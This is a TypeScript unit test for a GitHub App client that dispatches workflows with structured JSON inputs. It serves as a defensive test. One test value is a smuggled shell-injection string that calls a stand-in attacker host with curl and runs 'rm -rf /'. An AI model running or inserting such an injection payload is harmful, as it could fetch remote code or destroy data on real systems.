import type { NormalizedCommand } from '@qali/contracts';
import { readFileSync } from 'node:fs';
import { describe, expect, it, vi } from 'vitest';
import { parse as parseYaml } from 'yaml';
import { GitHubAppClient } from './github.js';

function pem(bytes: ArrayBuffer): string {
  const binary = String.fromCharCode(...new Uint8Array(bytes));
  const encoded =
    btoa(binary)
      .match(/.{1,64}/g)
      ?.join('\n') ?? '';
  return `-----BEGIN PRIVATE KEY-----\n${encoded}\n-----END PRIVATE KEY-----`;
}

describe('GitHub App workflow dispatch', () => {
  it('exchanges a JWT for an installation token and sends only structured inputs', async () => {
    const wrangler = JSON.parse(
      readFileSync(new URL('../wrangler.jsonc', import.meta.url), 'utf8')
    ) as {
      vars: { GITHUB_WORKFLOW_FILE: string };
    };
    const workflow = parseYaml(
      readFileSync(new URL('../../../.github/workflows/execute.yml', import.meta.url), 'utf8')
    ) as {
      on: { workflow_dispatch: { inputs: Record<string, unknown> } };
    };
    const keys = await crypto.subtle.generateKey(
      {
        name: 'RSASSA-PKCS1-v1_5',
        modulusLength: 2048,
        publicExponent: new Uint8Array([1, 0, 1]),
        hash: 'SHA-256'
      },
      true,
      ['sign', 'verify']
    );
    const privateKey = pem(await crypto.subtle.exportKey('pkcs8', keys.privateKey));
    const request = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(Response.json({ token: 'installation-token' }))
      .mockResolvedValueOnce(
        Response.json({
          workflow_run_id: 99,
          workflow_run: { id: 99, html_url: 'https://github.test/runs/99' }
        })
      );
    const client = new GitHubAppClient(
      {
        appId: '123',
        privateKey,
        installationId: '456',
        owner: 'qali',
        repo: 'control',
        workflowFile: wrangler.vars.GITHUB_WORKFLOW_FILE,
        ref: 'main',
        apiUrl: 'https://api.github.test'
      },
      request
    );
    const untrusted = '$(curl attacker.test)"; rm -rf /';
    const command: NormalizedCommand = {
      intent: 'run-test-suite',
      project: { id: 'demo', root: 'projects/demo' },
      requestedBy: 'U1',
      externalRole: 'developer',
      receivedAt: new Date().toISOString(),
      parameters: { label: untrusted }
    };

    await expect(client.dispatch(command, 'request-1')).resolves.toEqual({
      runId: '99',
      htmlUrl: 'https://github.test/runs/99'
    });
    const tokenRequest = request.mock.calls[0]!;
    expect(tokenRequest[0]).toBe('https://api.github.test/app/installations/456/access_tokens');
    expect((tokenRequest[1]?.headers as Record<string, string>).authorization).toMatch(
      /^Bearer [^.]+\.[^.]+\.[^.]+$/
    );
    const dispatchRequest = request.mock.calls[1]!;
    expect(dispatchRequest[0]).toContain('/actions/workflows/execute.yml/dispatches');
    const body = JSON.parse(String(dispatchRequest[1]?.body));
    expect(body.return_run_details).toBe(true);
    expect(body.inputs).toEqual({
      request_id: 'request-1',
      correlation_json: '{}',
      project_json: JSON.stringify(command.project),
      intent: command.intent,
      parameters_json: JSON.stringify(command.parameters),
      command_json: JSON.stringify(command)
    });
    expect(Object.keys(body.inputs).sort()).toEqual(
      Object.keys(workflow.on.workflow_dispatch.inputs).sort()
    );
    expect(dispatchRequest[1]).not.toHaveProperty('shell');
    expect(dispatchRequest[1]).not.toHaveProperty('command');
  });
});
